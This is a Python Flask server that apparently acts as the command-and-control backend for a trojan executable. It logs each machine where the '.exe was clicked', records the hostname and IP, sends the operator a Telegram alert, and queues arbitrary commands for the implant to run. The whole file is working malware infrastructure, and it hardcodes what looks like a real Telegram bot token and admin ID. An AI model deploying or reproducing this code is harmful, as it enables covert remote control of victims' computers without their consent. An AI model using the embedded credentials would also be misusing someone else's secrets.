from flask import Flask, request, jsonify
import json
import os
import time
import threading
import requests

app = Flask(__name__)

# Data storage
devices = {}
device_lock = threading.Lock()

# Path to save device data
DATA_FILE = "devices_data.json"

# Your Telegram Bot settings
BOT_TOKEN = "8370598742:AAGtfxRT9rVDOThRavBnq_dFJFSXyHocK1s"  # Replace with your bot token
ADMIN_ID = 6586114356       # Replace with your user ID

def load_devices():
    """Load saved device data"""
    global devices
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            devices = json.load(f)

def save_devices():
    """Save device data"""
    with open(DATA_FILE, 'w') as f:
        json.dump(devices, f, indent=2)

def send_telegram_message(chat_id, message):
    """Send a message to Telegram group"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': message
    }
    try:
        requests.post(url, json=data, timeout=5)
    except:
        pass

load_devices()

@app.route('/register', methods=['POST'])
def register_device():
    """Register a device when .exe is clicked"""
    data = request.json
    device_id = data.get('device_id')
    exe_name = data.get('exe_name')
    computer_info = data.get('computer_info')
    group_id = data.get('group_id')
    
    with device_lock:
        devices[device_id] = {
            'exe_name': exe_name,
            'computer_info': computer_info,
            'last_seen': time.time(),
            'status': 'online',
            'group_id': group_id,
            'pending_command': None
        }
        save_devices()
    
    # Send notification to the specific group
    notification = f"🚨 {exe_name}.exe was clicked on: {computer_info.get('hostname', 'Unknown PC')} ({computer_info.get('ip', 'Unknown IP')})"
    if group_id:
        send_telegram_message(group_id, notification)
    
    return jsonify({'status': 'registered'})

@app.route('/devices', methods=['GET'])
def get_devices():
    """Get all connected devices"""
    return jsonify(devices)

@app.route('/command', methods=['POST'])
def send_command():
    """Send a command to a specific device"""
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = command
            save_devices()
            return jsonify({'status': 'command sent'})
        else:
            return jsonify({'status': 'device not found'}), 404

@app.route('/clear_command', methods=['POST'])
def clear_command():
    """Clear a command after execution"""
    data = request.json
    device_id = data.get('device_id')
    
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = None
            save_devices()
    
    return jsonify({'status': 'cleared'})

@app.route('/')
def home():
    """Home page"""
    return "PD_Research Server is Running!"

if __name__ == '__main__':
    # For production on Render, use Gunicorn instead
    app.run(host='0.0.0.0', port=5000)